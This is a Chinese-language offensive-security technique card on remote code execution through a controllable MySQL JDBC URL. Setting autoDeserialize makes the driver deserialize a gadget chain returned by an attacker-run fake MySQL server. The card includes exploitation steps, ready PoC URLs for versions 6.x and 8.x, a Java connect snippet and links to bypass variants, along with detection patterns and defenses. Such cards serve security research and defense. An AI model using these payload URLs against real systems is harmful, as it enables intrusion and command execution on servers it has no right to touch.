---
id: web-java-deserialization-mysql-jdbc-url-autodeserialize-rce
title: 直接可控 JDBC URL 加 autoDeserialize：恶意 MySQL 服务端返回序列化对象 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: mysql-jdbc-url-autodeserialize-rce
aliases:
- JDBC URL 反序列化
- MySQL JDBC 反序列化
- autoDeserialize 参数
- detectCustomCollations
- ServerStatusDiffInterceptor
- DriverManager.getConnection 注入
tags:
- java
- jdbc
- mysql
- deserialization
- autodeserialize
- rce
- mysql-fake-server
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:41:27+08:00'
  notes: 已对照原文与图01/02核对：6.0.2 下 detectCustomCollations=true&autoDeserialize=true 使 fake server 返回 CC 链，图02 栈显示 ResultSetImpl.getObject -> ResultSetUtil.resultSetToMap -> ConnectionImpl.buildCollationMapping，计算器弹出；8.x 用 queryInterceptors=ServerStatusDiffInterceptor。原文只给出复现用 6.0.2/8.x 环境版本，未给受影响版本区间，故未设置 versions。PoC 未在本机执行；frontmatter 无 sources/source_url。
---

## 一句话结论

当业务把用户可控的 JDBC URL（或可拼接进 URL 的连接参数）直接交给 `DriverManager.getConnection()` 时，攻击者可以在 URL 中加 `autoDeserialize=true` 并配合 `detectCustomCollations=true`（6.x）或 `queryInterceptors=ServerStatusDiffInterceptor`（8.x），让驱动连接恶意 MySQL 服务端；服务端在查询结果中返回序列化对象，驱动自动 `readObject`，从而触发反序列化 RCE。

## 原理

- MySQL Connector/J 的 `autoDeserialize=true` 允许对服务端返回的某些列做 Java 反序列化。正常情况下服务端只返回基础类型；一旦服务端由攻击者控制，就可以在结果集中放入任意序列化字节。
- 6.x 的 `detectCustomCollations=true` 会在建立连接时查询字符集/排序规则信息，结果集进入 `ResultSetImpl.getObject`，经 `ResultSetUtil.resultSetToMap`、`ConnectionImpl.buildCollationMapping` 等路径，对服务端数据执行 `ObjectInputStream.readObject`。
- 8.x 中原文使用 `queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`：该拦截器在连接初始化时执行 `SHOW SESSION STATUS`，服务端返回的 value 会被同样反序列化。
- 触发只需要“连接串可控”这一个条件：URL 中的 `user` 被恶意服务端当作选择 gadget 的标识（原文用 `user=deser_CUSTOM`），服务端据此返回预置的 Commons Collections 序列化链；目标 classpath 有对应 gadget 时即命令执行。
- 该问题与 Fastjson 等反序列化入口无关，是 JDBC 驱动自身的安全配置被外部输入打开造成的；任何把外部数据拼进 JDBC URL 的功能（数据源配置、数据库连接测试、报表/ETL 连接参数）都可能成为入口。

## 触发条件

- 应用使用受影响的 MySQL Connector/J（原文以 6.0.2 演示，另说明 8.x 对应 `ServerStatusDiffInterceptor` 链）。
- 用户可控制 JDBC URL 的 host/参数，或可控参数被拼接进 `?` 后的查询串。
- 目标能出网访问攻击者的 MySQL 服务端。
- 目标 classpath 存在可用 gadget（原文引入 commons-collections 3.1）。

## 利用步骤

1. 确认连接参数可控，且应用实际执行 `DriverManager.getConnection(url)`；可通过报错、连接延迟或自建 MySQL 服务端观察回连。
2. 启动恶意 MySQL 服务端（如 MySQL_Fake_Server），选择与目标 classpath 匹配的 gadget，指定命令。
3. 构造带 `autoDeserialize=true` 的 JDBC URL；6.x 加 `detectCustomCollations=true`，8.x 加 `ServerStatusDiffInterceptor` 拦截器。
4. 让应用使用该 URL 建连，服务端在握手/查询响应中返回序列化数据，驱动触发 `readObject`。
5. 观察命令执行结果或回连。

## PoC

6.x（原文环境 mysql-connector-java 6.0.2）：

```text
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=deser_CUSTOM
```

8.x：

```text
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=deser_CUSTOM&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

配套代码只需把上述 URL 交给驱动：

```java
Class.forName("com.mysql.cj.jdbc.Driver");
DriverManager.getConnection(url);
```

恶意服务端返回的序列化字节由 fake server 按所选 gadget 生成，不在客户端侧提交；原文用 Commons Collections 链验证弹出计算器。

## 变体与关联

- 变体：8.x 也可使用 URL 编码后的 key/value 绕过前置字符串检查，见 [[web-java-deserialization-jdbc-url-waf-parser-bypass]]。
- 变体：无法出网时改用 `socketFactory=com.mysql.jdbc.NamedPipeSocketFactory` + `namedPipePath` 读取本地管道文件中的序列化数据（见 Fastjson 卡片中的不出网形态）。
- 关联：[[web-java-deser-fastjson-mysql-jdbc-autodeserialize]]（同一驱动特性，入口换成 Fastjson 实例化连接类）。
- 关联：[[web-java-deserialization-h2-jdbc-init-create-alias-rce]]（另一类 JDBC URL 参数直接导致 RCE 的驱动）。
- 边界：驱动版本修复/默认关闭 `autoDeserialize`、目标不出网、无可用 gadget 时，该链不成立。

## 检测与防御

- 检测：连接串中出现 `autoDeserialize`、`detectCustomCollations`、`ServerStatusDiffInterceptor`；应用进程主动连接陌生 3306；驱动日志/异常中出现反序列化调用栈。
- 防御：不要把用户输入拼进 JDBC URL；数据库连接参数使用白名单，禁止 `autoDeserialize`、自定义 `socketFactory`、拦截器等属性；升级 MySQL 驱动到默认关闭不安全行为的版本。
- 加固：限制应用出网；对反序列化入口加类白名单过滤器；数据库连接测试功能只允许预置数据源。
